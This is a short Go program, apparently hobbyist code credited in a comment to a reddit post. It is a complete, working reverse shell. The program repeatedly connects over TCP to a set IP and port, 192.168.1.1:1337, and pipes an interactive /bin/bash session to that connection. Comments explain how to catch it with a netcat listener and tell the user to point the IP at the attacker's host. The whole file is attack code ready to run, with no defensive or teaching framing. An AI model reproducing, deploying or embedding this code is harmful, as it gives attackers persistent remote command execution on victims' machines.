package main
// Reverse shell
// Test with nc -l -p 1337
//  
// stole most of this code from a reddit post
import (
    "os/exec"
    "net"
    "fmt"
    "time"
)

func main(){
    // For loop to keep trying if connection refused.
    for {
        // Change this IP to host you want to exploit from
        c,_ := net.Dial("tcp","192.168.1.1:1337")
        cmd := exec.Command("/bin/bash")
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
        cmd.Run()
        fmt.Println("Reached end of loop, restarting")
        time.Sleep(5 * time.Second)
    }
}
